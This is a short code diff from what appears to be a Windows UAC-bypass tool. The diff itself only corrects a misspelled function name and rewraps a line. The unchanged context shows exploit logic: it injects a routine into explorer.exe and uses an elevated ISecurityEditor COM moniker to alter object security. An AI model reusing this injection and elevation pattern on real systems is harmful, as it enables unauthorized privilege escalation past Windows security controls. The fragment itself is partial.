@@ -22,14 +22,14 @@
 ELOAD_PARAMETERS_2 g_ElevParams2;
 
 /*
-* ucmEvelatedAlterSecurityProc
+* ucmElevatedAlterSecurityProc
 *
 * Purpose:
 *
 * Change object security through ISecurityEditor(SetNamedInfo).
 *
 */
-DWORD WINAPI ucmEvelatedAlterSecurityProc(
+DWORD WINAPI ucmElevatedAlterSecurityProc(
 	PELOAD_PARAMETERS_2 elvpar
 	)
 {
@@ -65,7 +65,10 @@ DWORD WINAPI ucmEvelatedAlterSecurityProc(
 
 		bop.cbStruct = sizeof(bop);
 		bop.dwClassContext = CLSCTX_LOCAL_SERVER;
-		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID_ISecurityEditor, &SecurityEditor1);
+
+		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, 
+			&elvpar->xIID_ISecurityEditor, &SecurityEditor1);
+
 		if (r != S_OK)
 			break;
 		if (SecurityEditor1 == NULL) {
@@ -173,7 +176,7 @@ BOOL ucmSimdaAlterObjectSecurity(
 		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
 		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");
 
-		bResult = ucmInjectExplorer(&g_ElevParams2, ucmEvelatedAlterSecurityProc);
+		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedAlterSecurityProc);
 
 	} while (cond);
 
